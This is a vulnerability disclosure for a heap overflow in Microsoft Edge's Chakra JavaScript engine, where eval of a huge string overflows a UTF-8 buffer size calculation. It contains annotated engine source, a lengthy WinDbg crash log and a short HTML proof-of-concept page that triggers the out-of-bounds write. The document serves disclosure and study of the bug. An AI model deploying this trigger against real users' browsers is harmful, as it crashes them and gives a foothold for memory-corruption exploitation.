@@ -1,0 +1,378 @@
+<!--
+Report by Huang Anwen, He Xiaoxiao of ichunqiu Ker Team
+
+There is a classic heap overflow when eval a string which large enough in Chakra!
+This issue can be reproduced steadly in uptodate Edge in Win10 WIP.
+An exception will occur immediatly when opening POC.html in Edge.
+
+
+
+	//ChakraCore-master\lib\Runtime\Library\GlobalObject.cpp
+	
+    ScriptFunction* GlobalObject::DefaultEvalHelper(ScriptContext* scriptContext, const char16 *source, int sourceLength, ModuleID moduleID, uint32 grfscr, LPCOLESTR pszTitle, BOOL registerDocument, BOOL isIndirect, BOOL strictMode)
+    {
+        Assert(sourceLength >= 0);
+        AnalysisAssert(scriptContext);
+        if (scriptContext->GetThreadContext()->EvalDisabled())
+        {
+            throw Js::EvalDisabledException();
+        }
+
+#ifdef PROFILE_EXEC
+        scriptContext->ProfileBegin(Js::EvalCompilePhase);
+#endif
+        void * frameAddr = nullptr;
+        GET_CURRENT_FRAME_ID(frameAddr);
+
+        HRESULT hr = S_OK;
+        HRESULT hrParser = S_OK;
+        HRESULT hrCodeGen = S_OK;
+        CompileScriptException se;
+        Js::ParseableFunctionInfo * funcBody = NULL;
+
+        BEGIN_LEAVE_SCRIPT_INTERNAL(scriptContext);
+        BEGIN_TRANSLATE_EXCEPTION_TO_HRESULT
+        {
+            uint cchSource = sourceLength;
+            size_t cbUtf8Buffer = (cchSource + 1) * 3;		//OVERFLOW when cchSource large enough!!!
+
+            ArenaAllocator tempArena(_u("EvalHelperArena"), scriptContext->GetThreadContext()->GetPageAllocator(), Js::Throw::OutOfMemory);
+            LPUTF8 utf8Source = AnewArray(&tempArena, utf8char_t, cbUtf8Buffer);		//Allocate memory on Arena heap with a incorrect but smaller size
+
+            Assert(cchSource < MAXLONG);
+            size_t cbSource = utf8::EncodeIntoAndNullTerminate(utf8Source, source, static_cast< charcount_t >(cchSource));		//OOB write HERE!!!
+            Assert(cbSource + 1 <= cbUtf8Buffer);
+
+            SRCINFO const * pSrcInfo = scriptContext->GetModuleSrcInfo(moduleID);
+			
+            [...]
+
+            LEAVE_PINNED_SCOPE();
+        }
+        END_TRANSLATE_EXCEPTION_TO_HRESULT(hr);
+        END_LEAVE_SCRIPT_INTERNAL(scriptContext);
+
+
+#ifdef PROFILE_EXEC
+        scriptContext->ProfileEnd(Js::EvalCompilePhase);
+#endif
+        THROW_KNOWN_HRESULT_EXCEPTIONS(hr, scriptContext);
+
+        if (!SUCCEEDED(hrParser))
+        {
+            JavascriptError::ThrowParserError(scriptContext, hrParser, &se);
+        }
+        else if (!SUCCEEDED(hrCodeGen))
+        {
+            [...]
+        }
+        else
+        {
+
+            [...]
+
+            ScriptFunction* pfuncScript = funcBody->IsCoroutine() ?
+                scriptContext->GetLibrary()->CreateGeneratorVirtualScriptFunction(funcBody) :
+                scriptContext->GetLibrary()->CreateScriptFunction(funcBody);
+
+            return pfuncScript;
+        }
+    }
+	
+	
+	//ChakraCore-master\lib\Common\Codex\Utf8Codex.cpp
+    __range(0, cch * 3)
+    size_t EncodeIntoAndNullTerminate(__out_ecount(cch * 3 + 1) utf8char_t *buffer, __in_ecount(cch) const char16 *source, charcount_t cch)
+    {
+        size_t result = EncodeInto(buffer, source, cch);
+        buffer[result] = 0;
+        return result;
+    }
+	
+	//ChakraCore-master\lib\Common\Codex\Utf8Codex.cpp
+    __range(0, cch * 3)
+        size_t EncodeInto(__out_ecount(cch * 3) LPUTF8 buffer, __in_ecount(cch) const char16 *source, charcount_t cch)
+    {
+        return EncodeIntoImpl<true>(buffer, source, cch);
+    }
+	
+	//ChakraCore-master\lib\Common\Codex\Utf8Codex.cpp
+	    template <bool cesu8Encoding>
+    __range(0, cchIn * 3)
+    size_t EncodeIntoImpl(__out_ecount(cchIn * 3) LPUTF8 buffer, __in_ecount(cchIn) const char16 *source, charcount_t cchIn)
+    {
+        charcount_t cch = cchIn; // SAL analysis gets confused by EncodeTrueUtf8's dest buffer requirement unless we alias cchIn with a local
+        LPUTF8 dest = buffer;
+
+        if (!ShouldFastPath(dest, source)) goto LSlowPath;
+
+LFastPath:
+        while (cch >= 4)
+        {
+            uint32 first = ((const uint32 *)source)[0];
+            if ( (first & 0xFF80FF80) != 0) goto LSlowPath;
+            uint32 second = ((const uint32 *)source)[1];
+            if ( (second & 0xFF80FF80) != 0) goto LSlowPath;
+            *(uint32 *)dest = (first & 0x0000007F) | ((first & 0x007F0000) >> 8) | ((second & 0x0000007f) << 16) | ((second & 0x007F0000) << 8);		//OOB write HERE finally!!!
+            dest += 4;
+            source += 4;
+            cch -= 4;
+        }
+
+LSlowPath:
+        if (cesu8Encoding)
+        {
+			[...]
+        }
+        else
+        {
+            [...]
+        }
+
+        return dest - buffer;
+    }
+
+Microsoft (R) Windows Debugger Version 6.12.0002.633 AMD64
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+*** wait with pending attach
+Symbol search path is: SRV*c:\mysymbol* http://msdl.microsoft.com/download/symbols
+Executable search path is: 
+ModLoad: 00007ff6`26db0000 00007ff6`26dd5000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\MicrosoftEdgeCP.exe
+ModLoad: 00007ffc`fc060000 00007ffc`fc23b000   C:\Windows\SYSTEM32\ntdll.dll
+ModLoad: 00007ffc`fb9d0000 00007ffc`fba7e000   C:\Windows\System32\KERNEL32.DLL
+ModLoad: 00007ffc`f90a0000 00007ffc`f92e9000   C:\Windows\System32\KERNELBASE.dll
+ModLoad: 00007ffc`f6b90000 00007ffc`f6c0e000   C:\Windows\SYSTEM32\apphelp.dll
+ModLoad: 00007ffc`fbbb0000 00007ffc`fbea9000   C:\Windows\System32\combase.dll
+ModLoad: 00007ffc`f94c0000 00007ffc`f95b6000   C:\Windows\System32\ucrtbase.dll
+ModLoad: 00007ffc`fba80000 00007ffc`fbba5000   C:\Windows\System32\RPCRT4.dll
+ModLoad: 00007ffc`f8620000 00007ffc`f868a000   C:\Windows\System32\bcryptPrimitives.dll
+ModLoad: 00007ffc`fbfc0000 00007ffc`fc05d000   C:\Windows\System32\msvcrt.dll
+ModLoad: 00007ffc`ebd60000 00007ffc`ebdc0000   C:\Windows\SYSTEM32\wincorlib.DLL
+ModLoad: 00007ffc`fac50000 00007ffc`fad10000   C:\Windows\System32\OLEAUT32.dll
+ModLoad: 00007ffc`f8580000 00007ffc`f861a000   C:\Windows\System32\msvcp_win.dll
+ModLoad: 00007ffc`f8560000 00007ffc`f8571000   C:\Windows\System32\kernel.appcore.dll
+ModLoad: 00007ffc`dae30000 00007ffc`db1f4000   C:\Windows\SystemApps\Microsoft.MicrosoftEdge_8wekyb3d8bbwe\EdgeContent.dll
+ModLoad: 00007ffc`f86f0000 00007ffc`f8de2000   C:\Windows\System32\Windows.Storage.dll
+ModLoad: 00007ffc`f95c0000 00007ffc`f9661000   C:\Windows\System32\advapi32.dll
+ModLoad: 00007ffc`faf10000 00007ffc`faf69000   C:\Windows\System32\sechost.dll
+ModLoad: 00007ffc`f97b0000 00007ffc`f9801000   C:\Windows\System32\shlwapi.dll
+ModLoad: 00007ffc`fb9a0000 00007ffc`fb9c7000   C:\Windows\System32\GDI32.dll
+ModLoad: 00007ffc`f8e40000 00007ffc`f8fc8000   C:\Windows\System32\gdi32full.dll
+ModLoad: 00007ffc`fadc0000 00007ffc`faf0a000   C:\Windows\System32\USER32.dll
+ModLoad: 00007ffc`f8fd0000 00007ffc`f8fee000   C:\Windows\System32\win32u.dll
+ModLoad: 00007ffc`fad10000 00007ffc`fadba000   C:\Windows\System32\shcore.dll
+ModLoad: 00007ffc`f84d0000 00007ffc`f851c000   C:\Windows\System32\powrprof.dll
+ModLoad: 00007ffc`f8520000 00007ffc`f8535000   C:\Windows\System32\profapi.dll
+ModLoad: 00007ffc`eff10000 00007ffc`f0196000   C:\Windows\SYSTEM32\iertutil.dll
+ModLoad: 00007ffc`f8400000 00007ffc`f8429000   C:\Windows\SYSTEM32\USERENV.dll
+ModLoad: 00007ffc`f3a60000 00007ffc`f3a86000   C:\Windows\SYSTEM32\clipc.dll
+ModLoad: 00007ffc`f77d0000 00007ffc`f7801000   C:\Windows\SYSTEM32\ntmarta.dll
+ModLoad: 00007ffc`f7f20000 00007ffc`f7f37000   C:\Windows\SYSTEM32\cryptsp.dll
+ModLoad: 00007ffc`f7b60000 00007ffc`f7c04000   C:\Windows\SYSTEM32\DNSAPI.dll
+ModLoad: 00007ffc`faf70000 00007ffc`fafdc000   C:\Windows\System32\WS2_32.dll
+ModLoad: 00007ffc`f9710000 00007ffc`f9718000   C:\Windows\System32\NSI.dll
+ModLoad: 00007ffc`f9780000 00007ffc`f97ad000   C:\Windows\System32\IMM32.DLL
+ModLoad: 00007ffc`f7b20000 00007ffc`f7b57000   C:\Windows\SYSTEM32\IPHLPAPI.DLL
+ModLoad: 00007ffc`f6dc0000 00007ffc`f6f30000   C:\Windows\SYSTEM32\twinapi.appcore.dll
+ModLoad: 00007ffc`f83a0000 00007ffc`f83c5000   C:\Windows\SYSTEM32\bcrypt.dll
+ModLoad: 00007ffc`f7600000 00007ffc`f7621000   C:\Windows\SYSTEM32\profext.dll
+ModLoad: 00007ffc`e85e0000 00007ffc`e8654000   C:\Windows\SYSTEM32\msiso.dll
+ModLoad: 00007ffc`f4060000 00007ffc`f4082000   C:\Windows\SYSTEM32\EShims.dll
+ModLoad: 00007ffc`efdc0000 00007ffc`efddb000   C:\Windows\SYSTEM32\MPR.dll
+ModLoad: 00007ffc`fb410000 00007ffc`fb555000   C:\Windows\System32\ole32.dll
+ModLoad: 00007ffc`f6cf0000 00007ffc`f6d85000   C:\Windows\system32\uxtheme.dll
+ModLoad: 00007ffc`e7140000 00007ffc`e71e1000   C:\Program Files\Common Files\microsoft shared\ink\tiptsf.dll
+ModLoad: 00007ffc`dc6c0000 00007ffc`ddd71000   C:\Windows\SYSTEM32\edgehtml.dll
+ModLoad: 00007ffc`f0b20000 00007ffc`f0b5f000   C:\Windows\SYSTEM32\MLANG.dll
+ModLoad: 00007ffc`f5120000 00007ffc`f5259000   C:\Windows\SYSTEM32\wintypes.dll
+ModLoad: 00007ffc`dbb80000 00007ffc`dc36b000   C:\Windows\SYSTEM32\chakra.dll
+ModLoad: 00007ffc`f5640000 00007ffc`f56b6000   C:\Windows\SYSTEM32\policymanager.dll
+ModLoad: 00007ffc`f55a0000 00007ffc`f562f000   C:\Windows\SYSTEM32\msvcp110_win.dll
+ModLoad: 00007ffc`f41e0000 00007ffc`f4376000   C:\Windows\SYSTEM32\PROPSYS.dll
+ModLoad: 00007ffc`e6230000 00007ffc`e62fb000   C:\Windows\System32\ieproxy.dll
+ModLoad: 00007ffc`eb8e0000 00007ffc`eb9e6000   C:\Windows\System32\Windows.UI.dll
+ModLoad: 00007ffc`eb570000 00007ffc`eb5f2000   C:\Windows\SYSTEM32\TextInputFramework.dll
+ModLoad: 00007ffc`f65d0000 00007ffc`f66b3000   C:\Windows\SYSTEM32\CoreMessaging.dll
+ModLoad: 00007ffc`eb600000 00007ffc`eb8d2000   C:\Windows\SYSTEM32\CoreUIComponents.dll
+ModLoad: 00007ffc`f1ec0000 00007ffc`f1ed5000   C:\Windows\SYSTEM32\usermgrcli.dll
+ModLoad: 00007ffc`ee290000 00007ffc`ee7c1000   C:\Windows\System32\OneCoreUAPCommonProxyStub.dll
+ModLoad: 00007ffc`f9810000 00007ffc`fac47000   C:\Windows\System32\shell32.dll
+ModLoad: 00007ffc`f8df0000 00007ffc`f8e39000   C:\Windows\System32\cfgmgr32.dll
+ModLoad: 00007ffc`ec070000 00007ffc`ec09a000   C:\Windows\SYSTEM32\dwmapi.dll
+ModLoad: 00007ffc`e8d00000 00007ffc`e902e000   C:\Windows\SYSTEM32\WININET.dll
+ModLoad: 00007ffc`f83d0000 00007ffc`f8400000   C:\Windows\SYSTEM32\SspiCli.dll
+ModLoad: 00007ffc`fb020000 00007ffc`fb186000   C:\Windows\System32\msctf.dll
+ModLoad: 00007ffc`eea60000 00007ffc`eeb62000   C:\Windows\SYSTEM32\mrmcorer.dll
+ModLoad: 00007ffc`e4cf0000 00007ffc`e4d00000   C:\Windows\SYSTEM32\tokenbinding.dll
+ModLoad: 00007ffc`ebcc0000 00007ffc`ebd29000   C:\Windows\SYSTEM32\Bcp47Langs.dll
+ModLoad: 00007ffc`e9920000 00007ffc`e993b000   C:\Windows\SYSTEM32\ondemandconnroutehelper.dll
+ModLoad: 00007ffc`f28b0000 00007ffc`f2987000   C:\Windows\SYSTEM32\winhttp.dll
+ModLoad: 00007ffc`f7d80000 00007ffc`f7ddc000   C:\Windows\system32\mswsock.dll
+ModLoad: 00007ffc`f3c20000 00007ffc`f3c2b000   C:\Windows\SYSTEM32\WINNSI.DLL
+ModLoad: 00007ffc`f01f0000 00007ffc`f03b8000   C:\Windows\SYSTEM32\urlmon.dll
+ModLoad: 00007ffc`f8390000 00007ffc`f839b000   C:\Windows\SYSTEM32\CRYPTBASE.DLL
+ModLoad: 00007ffc`e5180000 00007ffc`e519a000   C:\Windows\System32\Windows.Shell.ServiceHostBuilder.dll
+ModLoad: 00007ffc`e2c80000 00007ffc`e2e0a000   C:\Windows\SYSTEM32\ieapfltr.dll
+ModLoad: 00007ffc`f5820000 00007ffc`f583d000   C:\Windows\System32\rmclient.dll
+ModLoad: 00007ffc`e3e70000 00007ffc`e3e88000   C:\Windows\System32\UiaManager.dll
+ModLoad: 00007ffc`e24c0000 00007ffc`e2507000   C:\Windows\system32\dataexchange.dll
+ModLoad: 00007ffc`f5cf0000 00007ffc`f5fcf000   C:\Windows\SYSTEM32\d3d11.dll
+ModLoad: 00007ffc`f66c0000 00007ffc`f67e2000   C:\Windows\SYSTEM32\dcomp.dll
+ModLoad: 00007ffc`f7340000 00007ffc`f73e4000   C:\Windows\SYSTEM32\dxgi.dll
+ModLoad: 00007ffc`ed850000 00007ffc`ed8d2000   C:\Windows\system32\twinapi.dll
+ModLoad: 00007ffc`df920000 00007ffc`df99a000   C:\Windows\SYSTEM32\windows.ui.core.textinput.dll
+ModLoad: 00007ffc`dc620000 00007ffc`dc648000   C:\Windows\SYSTEM32\srpapi.dll
+ModLoad: 00007ffc`f92f0000 00007ffc`f94b9000   C:\Windows\System32\CRYPT32.dll
+ModLoad: 00007ffc`f8540000 00007ffc`f8551000   C:\Windows\System32\MSASN1.dll
+ModLoad: 00007ffc`deaf0000 00007ffc`deb4a000   C:\Windows\System32\Windows.Graphics.dll
+ModLoad: 00007ffc`f3ba0000 00007ffc`f3bfd000   C:\Windows\SYSTEM32\ninput.dll
+ModLoad: 00007ffc`f6020000 00007ffc`f65c4000   C:\Windows\SYSTEM32\d2d1.dll
+ModLoad: 00007ffc`e9a00000 00007ffc`e9cbf000   C:\Windows\SYSTEM32\DWrite.dll
+ModLoad: 00007ffc`dc5e0000 00007ffc`dc5ef000   C:\Windows\System32\Windows.Internal.SecurityMitigationsBroker.dll
+ModLoad: 00007ffc`eb400000 00007ffc`eb442000   C:\Windows\SYSTEM32\vm3dum64.dll
+ModLoad: 00007ffc`eb390000 00007ffc`eb3f7000   C:\Windows\SYSTEM32\D3D10Level9.dll
+ModLoad: 00007ffc`f3150000 00007ffc`f31bb000   C:\Windows\System32\oleacc.dll
+ModLoad: 00007ffc`dc5d0000 00007ffc`dc5e0000   C:\Windows\system32\msimtf.dll
+ModLoad: 00007ffc`e9970000 00007ffc`e99f8000   C:\Windows\system32\directmanipulation.dll
+ModLoad: 00007ffc`db710000 00007ffc`db724000   C:\Windows\System32\Windows.System.Profile.PlatformDiagnosticsAndUsageDataSettings.dll
+ModLoad: 00007ffc`dc590000 00007ffc`dc5c8000   C:\Windows\System32\smartscreenps.dll
+ModLoad: 00007ffc`e9780000 00007ffc`e9908000   C:\Windows\SYSTEM32\windows.globalization.dll
+(2004.11d0): Access violation - code c0000005 (!!! second chance !!!)
+chakra!utf8::EncodeIntoImpl<1>+0xb5:
+00007ffc`dbdb69e5 418910          mov     dword ptr [r8],edx ds:0000023d`22d81000=????????
+0:016> r
+rax=0000000000000061 rbx=000000bb058fb4f0 rcx=0000000000006100
+rdx=0000000061616161 rsi=0000000000000002 rdi=000000bb058fb000
+rip=00007ffcdbdb69e5 rsp=000000bb058fb700 rbp=0000023d1f937b60
+ r8=0000023d22d81000  r9=0000023d330e4fc8 r10=000000005555462c
+r11=0000023d22d80030 r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000 r15=000000bb058fbd00
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010200
+chakra!utf8::EncodeIntoImpl<1>+0xb5:
+00007ffc`dbdb69e5 418910          mov     dword ptr [r8],edx ds:0000023d`22d81000=????????
+0:016> !address r8
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\SYSTEM32\vm3dum64.dll - 
+*** ERROR: Symbol file could not be found.  Defaulted to export symbols for C:\Windows\System32\ole32.dll - 
+
+                                     
+Usage:                  <unclassified>
+Allocation Base:        0000023d`22d80000
+Base Address:           0000023d`22d81000
+End Address:            0000023d`22d85000
+Region Size:            00000000`00004000
+Type:                   00020000	MEM_PRIVATE
+State:                  00002000	MEM_RESERVE
+Protect:                00000000	
+
+0:016> !address r8-1
+Usage:                  <unclassified>
+Allocation Base:        0000023d`22d80000
+Base Address:           0000023d`22d80000
+End Address:            0000023d`22d81000
+Region Size:            00000000`00001000
+Type:                   00020000	MEM_PRIVATE
+State:                  00001000	MEM_COMMIT
+Protect:                00000004	PAGE_READWRITE
+
+0:016> db 23d`22d80000
+0000023d`22d80000  01 00 00 00 00 00 00 00-80 77 93 1f 3d 02 00 00  .........w..=...
+0000023d`22d80010  00 00 00 00 00 00 00 00-d0 0f 00 00 00 00 00 00  ................
+0000023d`22d80020  00 00 d8 22 3d 02 00 00-00 00 00 00 00 00 00 00  ..."=...........
+0000023d`22d80030  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80040  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80050  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80060  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80070  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0:016> kb
+RetAddr           : Args to Child                                                           : Call Site
+00007ffc`dbbf2611 : 0000023d`22d80030 0000023d`330e3020 00000000`55555600 00000235`00000004 : chakra!utf8::EncodeIntoImpl<1>+0xb5
+00007ffc`dbb98201 : 0000023d`1f937b60 0000023d`330e3020 0000023d`55555600 000000bb`00000000 : chakra!Js::GlobalObject::DefaultEvalHelper+0x171
+00007ffc`dbb97fb8 : 0000023d`22de0000 00007ffc`dc2c9f80 0000023d`00000000 0000023d`22ddc000 : chakra!Js::GlobalObject::VEval+0x231
+00007ffc`dbb97ecd : 000000bb`058fbd40 0000023d`22ddb5c0 0000023d`1f934ba0 000000bb`058fbd00 : chakra!Js::GlobalObject::EntryEvalHelper+0xc8
+00007ffc`dbdf6be3 : 0000023d`22ddb5c0 00000000`18000003 0000023d`22df0020 0000023d`22df9460 : chakra!Js::GlobalObject::EntryEval+0x7d
+00007ffc`dbce6bf3 : 0000023d`1f934ba0 00000000`00000018 000000bb`058fbde8 0000023d`22ddc000 : chakra!amd64_CallFunction+0x93
+00007ffc`dbba71ac : 0000023d`22ddb5c0 00007ffc`dbb97e50 000000bb`058fbe10 000000bb`058fbfa0 : chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+00007ffc`dbba77b4 : 000000bb`058fbfa0 0000023d`22ecc053 0000023d`22ddb5c0 00007ffc`00000008 : chakra!Js::InterpreterStackFrame::OP_CallCommon<Js::OpLayoutDynamicProfile<Js::OpLayoutT_CallIExtendedFlags<Js::LayoutSizePolicy<0> > > >+0x114
+00007ffc`dbc84920 : 000000bb`058fbfa0 0000023d`22ecc053 0000023d`058fbfa0 0000023d`22ecc061 : chakra!Js::InterpreterStackFrame::OP_ProfiledReturnTypeCallIExtendedFlags<Js::OpLayoutT_CallIExtendedFlags<Js::LayoutSizePolicy<0> > >+0x5c
+00007ffc`dbc7ff2c : 000000bb`058fbfa0 00000000`00000000 00000000`00000000 00000000`00000000 : chakra!Js::InterpreterStackFrame::ProcessProfiled+0x1250
+00007ffc`dbd180cc : 000000bb`058fbfa0 0000023d`33040000 000000bb`058fc150 00000000`00000001 : chakra!Js::InterpreterStackFrame::Process+0x12c
+00007ffc`dbd17be1 : 0000023d`22e00420 000000bb`058fc330 0000023d`33060fc2 000000bb`058fc348 : chakra!Js::InterpreterStackFrame::InterpreterHelper+0x4ac
+0000023d`33060fc2 : 000000bb`058fc380 00000000`00000000 00000000`00000000 00007ffc`dbdf6750 : chakra!Js::InterpreterStackFrame::InterpreterThunk+0x51
+00007ffc`dbdf6be3 : 0000023d`22e00420 00000000`00000000 00000000`00000000 00000000`00000000 : 0x23d`33060fc2
+00007ffc`dbce6bf3 : 0000023d`1f934ba0 00000000`00000000 0000023d`1f940c90 00007ffc`dbcfa837 : chakra!amd64_CallFunction+0x93
+00007ffc`dbd11810 : 0000023d`22e00420 00007ffc`dbdf6df0 000000bb`058fc480 0000023d`1f937b60 : chakra!Js::JavascriptFunction::CallFunction<1>+0x83
+00007ffc`dbd10a37 : 0000023d`22e00420 000000bb`058fc570 0000023d`1f937b60 00007ffc`fc027100 : chakra!Js::JavascriptFunction::CallRootFunctionInternal+0x100
+00007ffc`dbdd907e : 0000023d`22e00420 000000bb`058fc5d0 0000023d`1f937b60 0000023d`1f943000 : chakra!Js::JavascriptFunction::CallRootFunction+0x4b
+00007ffc`dbd3cd54 : 0000023d`22e00420 000000bb`058fc610 00000000`00000000 000000bb`058fc628 : chakra!ScriptSite::CallRootFunction+0x6a
+00007ffc`dbcd1b49 : 0000023d`1f937a50 0000023d`22e00420 000000bb`058fc6c0 00000000`00000000 : chakra!ScriptSite::Execute+0x124
+00007ffc`dbcd2e8e : 0000023d`1f934750 000000bb`058fcbc8 000000bb`058fcc00 000000bb`80000082 : chakra!ScriptEngine::ExecutePendingScripts+0x1a5
+00007ffc`dbcd3121 : 0000023d`1f934750 0000023d`2101f5c4 00000000`00000000 00000235`1f594330 : chakra!ScriptEngine::ParseScriptTextCore+0x436
+00007ffc`dcac3c75 : 0000023d`1f9347a0 0000023d`2101f5c4 00000235`00000042 00000000`00000000 : chakra!ScriptEngine::ParseScriptText+0xb1
+00007ffc`dcac3abe : 00000000`00000000 000000bb`058fca99 00000235`1f594260 00000235`00000000 : edgehtml!CJScript9Holder::ParseScriptText+0x119
+00007ffc`dcac35d7 : 00000000`00000000 00000235`1f594260 00000235`1f51c1c0 00000235`1f5941b0 : edgehtml!CScriptCollection::ParseScriptText+0x202
+00007ffc`dcac2f07 : 00000235`1f530c01 00000235`1f58c100 00000235`00000082 00007ffc`00000000 : edgehtml!CScriptData::CommitCode+0x357
+00007ffc`dcb82f8d : 00000000`ffffffff 00000235`1f51c460 00000000`ffffffff 00000000`00000000 : edgehtml!CScriptData::Execute+0x20f
+00007ffc`dc9c43d4 : 00000000`00000000 00000235`1f56c440 00000000`00000001 00007ffc`dcb7ceb9 : edgehtml!CHtmScriptParseCtx::Execute+0x7d
+00007ffc`dc9c34a1 : 00000235`1f530c00 00000000`00000000 00000235`1f530c00 00000235`1f50c8c0 : edgehtml!CHtmParseBase::Execute+0x204
+00007ffc`dcb7d23b : 00000000`04cd60c0 00000235`1f500000 00000235`1f5600b0 00000235`1f50c8c0 : edgehtml!CHtmPost::Exec+0x1e1
+00007ffc`dcb7d11f : 00000235`1f50c8c0 00000000`04cd60c0 0000023d`203725a0 00000000`00000000 : edgehtml!CHtmPost::Run+0x2f
+00007ffc`dcb7cfd3 : 00000235`1f500000 00000012`c245be01 00000000`00000002 00000235`1f541680 : edgehtml!PostManExecute+0x63
+00007ffc`dcb7ce6d : 00000235`1f50c8c0 00000012`c245be61 0000023d`00000000 00007ffc`eff34779 : edgehtml!PostManResume+0xa3
+00007ffc`dcb8b353 : 00000235`1f528600 0000023d`20350350 00000000`00000000 00000000`00000000 : edgehtml!CHtmPost::OnDwnChanCallback+0x3d
+00007ffc`dcb650db : 00000235`1f5082d0 0000023d`1f927e73 0000023d`1f902200 000000bb`058fd150 : edgehtml!CDwnChan::OnMethodCall+0x23
+00007ffc`dc9f1706 : 0000023d`1f902728 00000235`1f541680 0000023d`1f902260 000000bb`058fd180 : edgehtml!GWndAsyncTask::Run+0x1b
+00007ffc`dcb3a860 : 0000002b`dd92f8c0 00000235`1f5416e0 00000235`1f5600b0 00007ffc`dca99138 : edgehtml!HTML5TaskScheduler::RunReadiedTask+0x236
+00007ffc`dcb3a683 : 0000023d`20350350 00000000`00000000 00000000`00000002 00000235`1f508170 : edgehtml!TaskSchedulerBase::RunReadiedTasksInTaskQueueWithCallback+0x70
+00007ffc`dc9f22b3 : 000000bb`058fd630 00000000`00008002 00000235`1f508170 00007ffc`fade47df : edgehtml!HTML5TaskScheduler::RunReadiedTasks+0xa3
+00007ffc`dc9f07a5 : 00000000`00008002 00000235`1f500000 0000d687`35232df0 00000000`00000002 : edgehtml!NormalPriorityAtInputEventLoopDriver::DriveRegularPriorityTaskExecution+0x53
+00007ffc`fadcbc50 : 00000000`001b029a 00000000`00000001 00000000`00000002 00000000`80000012 : edgehtml!GlobalWndProc+0x125
+00007ffc`fadcb5cf : 00000235`1de0b5c0 00007ffc`dc9f0680 00000000`001b029a 00000000`001b029a : USER32!UserCallWinProcCheckWow+0x280
+00007ffc`dae36d0e : 000000bb`058fd5d0 00000000`00000000 0000023d`2030b260 00000000`00000000 : USER32!DispatchMessageWorker+0x19f
+00007ffc`dae4eecb : 00000000`00000000 00000000`00000001 00000235`1d929e40 00000235`1d8d4af0 : EdgeContent!CBrowserTab::_TabWindowThreadProc+0x3ee
+00007ffc`e85eb4a8 : 00000000`00000000 00000235`1d928f50 00000000`00000000 00000000`00000000 : EdgeContent!LCIETab_ThreadProc+0x2ab
+00007ffc`fb9e2774 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : msiso!_IsoThreadProc_WrapperToReleaseScope+0x48
+00007ffc`fc0d0d61 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : KERNEL32!BaseThreadInitThunk+0x14
+00000000`00000000 : 00000000`00000000 00000000`00000000 00000000`00000000 00000000`00000000 : ntdll!RtlUserThreadStart+0x21
+0:016> db r8 l-100
+0000023d`22d80f00  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f10  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f20  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f30  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f40  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f50  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f60  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f70  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f80  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80f90  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80fa0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80fb0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80fc0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80fd0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80fe0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0000023d`22d80ff0  61 61 61 61 61 61 61 61-61 61 61 61 61 61 61 61  aaaaaaaaaaaaaaaa
+0:016> r
+rax=0000000000000061 rbx=000000bb058fb4f0 rcx=0000000000006100
+rdx=0000000061616161 rsi=0000000000000002 rdi=000000bb058fb000
+rip=00007ffcdbdb69e5 rsp=000000bb058fb700 rbp=0000023d1f937b60
+ r8=0000023d22d81000  r9=0000023d330e4fc8 r10=000000005555462c
+r11=0000023d22d80030 r12=0000000000000000 r13=0000000000000000
+r14=0000000000000000 r15=000000bb058fbd00
+iopl=0         nv up ei pl nz na pe nc
+cs=0033  ss=002b  ds=002b  es=002b  fs=0053  gs=002b             efl=00010200
+chakra!utf8::EncodeIntoImpl<1>+0xb5:
+00007ffc`dbdb69e5 418910          mov     dword ptr [r8],edx ds:0000023d`22d81000=????????
+
+-->
+
+<html>
+<head>
+<title> POC </title>
+</head>
+<script>
+	//alert('');
+	var code = 'a'.repeat(0x55555600);
+	eval(code);
+</script>
+</html>
